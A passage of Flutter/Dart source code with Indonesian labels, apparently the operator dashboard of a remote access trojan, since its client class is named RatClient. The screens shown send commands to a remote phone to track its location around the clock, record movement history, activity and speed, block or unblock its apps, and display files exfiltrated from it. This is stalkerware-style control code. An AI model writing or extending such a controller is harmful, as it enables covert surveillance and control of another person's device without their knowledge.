          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text('FILE (${mime.isEmpty ? 'unknown' : mime})',
                  style: const TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 10,
                      color: Neo.mint)),
              const SizedBox(height: 12),
              if (bytes != null && (mime.contains('image') || bytes.length < 400000))
                ConstrainedBox(
                  constraints:
                      BoxConstraints(maxHeight: 320, maxWidth: 320),
                  child: Image.memory(bytes, fit: BoxFit.contain),
                )
              else if (bytes != null)
                Text('${bytes.length} bytes terkirim',
                    style: const TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 10,
                        color: Neo.textMuted))
              else
                const Text('DATA KOSONG',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 10,
                        color: Neo.coral)),
              const SizedBox(height: 12),
              TextButton(
                onPressed: () => Navigator.pop(context),
                child: const Text('TUTUP',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 10)),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// Ã¢â€â‚¬Ã¢â€â‚¬ Location view Ã¢â€â‚¬Ã¢â€â‚¬
class _LocationView extends StatelessWidget {
  final RatClient client;
  final String deviceId;

  const _LocationView({required this.client, required this.deviceId});

  String _fmtTime(dynamic t) {
    if (t == null) return '-';
    final dt = t is num
        ? DateTime.fromMillisecondsSinceEpoch(t.toInt())
        : DateTime.tryParse(t.toString());
    if (dt == null) return t.toString();
    final now = DateTime.now();
    final diff = now.difference(dt);
    if (diff.inSeconds < 60) return 'baru saja';
    if (diff.inMinutes < 60) return '${diff.inMinutes} menit lalu';
    if (diff.inHours < 24) return '${diff.inHours} jam lalu';
    return '${dt.day}/${dt.month} ${dt.hour.toString().padLeft(2, '0')}:${dt.minute.toString().padLeft(2, '0')}';
  }

  Color _actColor(String act) {
    switch (act) {
      case 'DIAM':
        return _green;
      case 'BERJALAN':
      case 'BERLARI':
        return _amber;
      case 'BERKENDARA':
        return _red;
      default:
        return Neo.textMuted;
    }
  }

  IconData _actIcon(String act) {
    switch (act) {
      case 'DIAM':
        return Icons.hourglass_empty;
      case 'BERJALAN':
        return Icons.directions_walk;
      case 'BERLARI':
        return Icons.directions_run;
      case 'BERSIKLING':
        return Icons.pedal_bike;
      case 'BERKENDARA':
        return Icons.directions_car;
      default:
        return Icons.help_outline;
    }
  }

  String _speedLabel(dynamic speed) {
    if (speed is! num || speed < 0) return '-';
    return '${(speed * 3.6).round()} km/jam';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        foregroundColor: Neo.textDark,
        title: const Text('LIVE TRACKING 24 JAM',
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 12,
                letterSpacing: 2,
                color: Neo.mint)),
        actions: [
          TextButton(
            onPressed: () {
              client.clearData(deviceId, 'location');
              client.clearData(deviceId, 'locationBundle');
              client.sendCommand(deviceId, 'getLocation', '');
              client.fetchLocationData(deviceId);
            },
            child: const Text('REFRESH',
                style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 9,
                    color: Neo.mint)),
          ),
        ],
      ),
      body: AnimatedBuilder(
        animation: client,
        builder: (context, _) {
          final d = client.deviceById(deviceId);
          final loc = client.dataFor(deviceId)['location'];
          final bundle = client.dataFor(deviceId)['locationBundle'];
          final historyRaw = bundle is Map ? bundle['history'] : null;
          final history = historyRaw is List
              ? historyRaw.cast<Map>().reversed.toList()
              : <Map>[];
          final lastKnown = loc ??
              (bundle is Map && bundle['last'] is Map ? bundle['last'] : null);
          final isTracking = d?.statusBool('locationTracking') ?? false;

          return ListView(
            padding: const EdgeInsets.all(16),
            children: [
              // Kartu "LAGI NGAPAIN"
              NeoCard(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        const Icon(Icons.bolt, size: 14, color: Neo.peach),
                        const SizedBox(width: 6),
                        const Text('LAGI NGAPAIN',
                            style: TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 9,
                                color: Neo.textMuted,
                                letterSpacing: 2)),
                        const Spacer(),
                        _PillSwitch(
                          value: isTracking,
                          activeColor: _green,
                          onChanged: (v) {
                            client.sendCommand(
                                deviceId, kCmdLocationTrack, v ? 'true' : 'false');
                            client.patchStatus(deviceId, 'locationTracking', v);
                          },
                        ),
                      ],
                    ),
                    const SizedBox(height: 10),
                    if (lastKnown != null)
                      Row(
                        children: [
                          _TileIcon(_actIcon(lastKnown['activity']?.toString() ?? ''),
                              _actColor(lastKnown['activity']?.toString() ?? ''),
                              size: 30),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  lastKnown['activity']?.toString() ?? 'UNKNOWN',
                                  style: TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 15,
                                      letterSpacing: 1,
                                      color: _actColor(
                                          lastKnown['activity']?.toString() ?? '')),
                                ),
                                const SizedBox(height: 3),
                                Text(
                                  'Speed: ${_speedLabel(lastKnown['speed'])}',
                                  style: const TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 9,
                                      color: Neo.textMuted),
                                ),
                              ],
                            ),
                          ),
                        ],
                      )
                    else
                      const Center(
                        child: Padding(
                          padding: EdgeInsets.all(16),
                          child: CircularProgressIndicator(
                              strokeWidth: 2, color: Neo.mint),
                        ),
                      ),
                  ],
                ),
              ),
              const SizedBox(height: 12),

              // Kartu lokasi terakhir
              if (lastKnown != null)
                Container(
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(12),
                    color: Neo.white,
                    border: Border.all(color: Neo.textDark, width: 2.5),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('LOKASI TERAKHIR',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 9,
                              color: Neo.textMuted,
                              letterSpacing: 2)),
                      const SizedBox(height: 8),
                      Text(
                        '${lastKnown['lat'] ?? '-'}, ${lastKnown['lng'] ?? '-'}',
                        style: const TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 12,
                            color: Neo.sky),
                      ),
                      if ((lastKnown['fullAddress']?.toString() ?? '').isNotEmpty) ...[
                        const SizedBox(height: 6),
                        Text(
                          lastKnown['fullAddress'].toString(),
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 9,
                              color: Neo.textMuted),
                        ),
                      ],
                      const SizedBox(height: 10),
                      Row(
                        children: [
                          Expanded(
                            child: _MiniBtn(
                              label: 'BUKA MAPS',
                              color: Neo.mint,
                              onTap: () {
                                final lat = lastKnown['lat'];
                                final lng = lastKnown['lng'];
                                if (lat != null && lng != null) {
                                  launchUrl(
                                      Uri.parse(
                                          'https://maps.google.com/?q=$lat,$lng'),
                                      mode: LaunchMode.externalApplication);
                                }
                              },
                            ),
                          ),
                          const SizedBox(width: 8),
                          Expanded(
                            child: _MiniBtn(
                              label: 'BERSIHKAN HISTORY',
                              color: Neo.coral,
                              onTap: () {
                                client.sendCommand(deviceId, 'location:clear', '');
                                client.clearData(deviceId, 'location');
                                client.clearData(deviceId, 'locationBundle');
                              },
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Text(
                        'Update terakhir: ${_fmtTime(lastKnown['time'])}',
                        style: const TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 8,
                            color: Neo.textMuted),
                      ),
                    ],
                  ),
                ),
              const SizedBox(height: 14),

              // History pergerakan
              Text('RIWAYAT PERGERAKAN (${history.length})',
                  style: const TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 9,
                      color: Neo.textMuted,
                      letterSpacing: 2)),
              const SizedBox(height: 8),
              if (history.isEmpty)
                const Padding(
                  padding: EdgeInsets.all(20),
                  child: Center(
                    child: Text('Belum ada riwayat. Nyalakan tracking & tunggu update.',
                        textAlign: TextAlign.center,
                        style: TextStyle(
                            fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted)),
                  ),
                )
              else
                ...history.take(60).map((pt) {
                  final act = pt['activity']?.toString() ?? '';
                  final addr = pt['fullAddress']?.toString() ?? '';
                  return Container(
                    margin: const EdgeInsets.only(bottom: 6),
                    padding: const EdgeInsets.symmetric(
                        horizontal: 10, vertical: 8),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(8),
                      color: Neo.cream,
                      border: Border.all(color: Neo.textDark, width: 2.5),
                    ),
                    child: Row(
                      children: [
                        Icon(_actIcon(act), size: 13, color: _actColor(act)),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(
                                '${pt['lat'] ?? '-'}, ${pt['lng'] ?? '-'}',
                                style: const TextStyle(
                                    fontFamily: 'ShareTechMono',
                                    fontSize: 9,
                                    color: Neo.textDark),
                              ),
                              if (addr.isNotEmpty) ...[
                                const SizedBox(height: 2),
                                Text(addr,
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                    style: const TextStyle(
                                        fontFamily: 'ShareTechMono',
                                        fontSize: 7,
                                        color: Neo.textMuted)),
                              ],
                            ],
                          ),
                        ),
                        Text(_fmtTime(pt['time']),
                            style: const TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 7,
                                color: Neo.textMuted)),
                      ],
                    ),
                  );
                }),
            ],
          );
        },
      ),
    );
  }
}

// Ã¢â€â‚¬Ã¢â€â‚¬ Block app view Ã¢â€â‚¬Ã¢â€â‚¬
class _BlockAppView extends StatefulWidget {
  final RatClient client;
  final String deviceId;
  const _BlockAppView({required this.client, required this.deviceId});

  @override
  State<_BlockAppView> createState() => _BlockAppViewState();
}

class _BlockAppViewState extends State<_BlockAppView> {
  String _query = '';

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        foregroundColor: Neo.textDark,
        title: const Text('BLOCK APP',
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 12,
                letterSpacing: 2,
                color: Neo.coral)),
        actions: [
          TextButton(
            onPressed: () {
              widget.client
                  .sendCommand(widget.deviceId, 'unblockAll', '');
              ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
                  content: Text('Semua app di-unblock',
                      style: TextStyle(fontFamily: 'ShareTechMono'))));
            },
            child: const Text('UNBLOCK ALL',
                style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 9,
                    color: Neo.mint)),
          ),
        ],
      ),
      body: Column(
        children: [
          Padding(
            padding: const EdgeInsets.all(16),
            child: TextField(
              onChanged: (v) => setState(() => _query = v.toLowerCase()),
              style: const TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
              decoration: InputDecoration(
                hintText: 'Cari aplikasi...',
                hintStyle: const TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted),
                prefixIcon: const Icon(Icons.search, size: 16, color: Neo.textMuted),
                filled: true,
                fillColor: Neo.cream,
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(10),
                  borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(10),
                  borderSide: const BorderSide(color: Neo.coral, width: 3),
                ),
              ),
            ),
          ),
          Expanded(
            child: AnimatedBuilder(
              animation: widget.client,
              builder: (context, _) {
                final apps = widget.client.dataFor(widget.deviceId)['apps'];
                if (apps == null) {
                  return const Center(
                    child: CircularProgressIndicator(
                        strokeWidth: 2, color: Neo.mint),
                  );
                }
                final list = apps is List ? apps.cast<Map>() : const <Map>[];
                final filtered = list.where((a) {
                  final name = a['name']?.toString().toLowerCase() ?? '';
                  final pkg = a['package']?.toString().toLowerCase() ?? '';
                  return _query.isEmpty ||
                      name.contains(_query) ||
                      pkg.contains(_query);
                }).toList();
                return ListView.separated(
                  padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                  itemCount: filtered.length,
                  separatorBuilder: (_, _) => const SizedBox(height: 6),
                  itemBuilder: (_, i) {
                    final a = filtered[i];
                    final name = a['name']?.toString() ?? '?';
                    final pkg = a['package']?.toString() ?? '';
                    final blocked = a['blocked'] == true;
                    return Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(12),
                        color: Neo.white,
                        border: Border.all(
                            color: blocked
                                ? Neo.coral
                                : Neo.textDark, width: 2.5),
                      ),
                      child: Row(
                        children: [
                          _TileIcon(
                              blocked
                                  ? Icons.block
                                  : Icons.check_circle_outline,
                              blocked ? Neo.coral : Neo.textMuted),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(name,
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                    style: const TextStyle(
                                        fontFamily: 'ShareTechMono',
                                        fontSize: 11,
                                        color: Neo.textDark)),
                                if (pkg.isNotEmpty)
                                  Text(pkg,
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                      style: const TextStyle(
                                          fontFamily: 'ShareTechMono',
                                          fontSize: 8,
                                          color: Neo.textMuted)),
                              ],
                            ),
                          ),
                          const SizedBox(width: 8),
                          _PillSwitch(
                            value: blocked,
                            activeColor: _red,
                            onChanged: (on) {
                              final d = widget.client
                                  .deviceById(widget.deviceId);
                              if (d != null) {
                                final list = (d.status['blockedApps']
                                        as List?) ??
                                    [];
                                if (on) {
                                  widget.client.sendCommand(
                                      widget.deviceId,
                                      kCmdBlockApp,
                                      jsonEncode({
                                        'package': pkg,
                                        'name': name
                                      }));
                                  d.status['blockedApps'] = [...list, pkg];
                                } else {
                                  widget.client.sendCommand(
                                      widget.deviceId,
                                      kCmdUnblockApp,
                                      pkg);
                                  d.status['blockedApps'] = list
                                      .where((e) => e != pkg)
                                      .toList();
                                }
                                a['blocked'] = on;
                                widget.client.refresh();
                              }
                            },
                          ),
                        ],
                      ),
                    );
                  },
                );
              },
            ),
          ),
        ],
      ),
    );
  }
}

// Ã¢â€â‚¬Ã¢â€â‚¬ Helper misc Ã¢â€â‚¬Ã¢â€â‚¬
class _TtsField extends StatelessWidget {
  final String label;
  final Widget child;
  const _TtsField({required this.label, required this.child});

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(label,
            style: const TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 8,
                color: Neo.textMuted,
                letterSpacing: 1)),
        const SizedBox(height: 4),
        Container(
          height: 36,
          padding: const EdgeInsets.symmetric(horizontal: 8),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(8),
            color: Neo.white,
            border: Border.all(color: Neo.textDark, width: 2),
          ),
          child: Center(child: child),
        ),
      ],
    );
  }
}

InputDecoration _ttsDeco() => InputDecoration(
      isDense: true,
      contentPadding: const EdgeInsets.symmetric(horizontal: 8, vertical: 8),
      filled: true,
      fillColor: Neo.cream,
      border: InputBorder.none,
    );

class _GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = Neo.mint.withValues(alpha: 0.06)
      ..strokeWidth = 1;
    const gap = 24.0;
    for (double x = 0; x < size.width; x += gap) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += gap) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

class _TerminalEntry {
  final String command;
  final dynamic value;
  final DateTime time;
  _TerminalEntry(this.command, this.value) : time = DateTime.now();
}

class _TerminalLine extends StatelessWidget {
  final _TerminalEntry entry;
  const _TerminalLine({required this.entry});

  @override
  Widget build(BuildContext context) {
    final v = entry.value;
    final hasValue = v != null && v.toString().isNotEmpty;
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 2),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            _hms(entry.time),
            style: const TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 8,
                color: Neo.textMuted),
          ),
          const SizedBox(width: 8),
          Text(r'$ ',
              style: const TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.mint)),
          Expanded(
            child: RichText(
              text: TextSpan(
                style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9),
                children: [
                  TextSpan(
                    text: entry.command,
                    style: const TextStyle(color: Neo.textDark, fontWeight: FontWeight.w700),
                  ),
                  if (hasValue)
                    TextSpan(
                      text: ' → ${v.toString().length > 80 ? '${v.toString().substring(0, 80)}...' : v.toString()}',
                      style: const TextStyle(color: Neo.textMuted),
                    ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  static String _hms(DateTime t) {
    String two(int n) => n.toString().padLeft(2, '0');
    return '${two(t.hour)}:${two(t.minute)}:${two(t.second)}';
  }
}
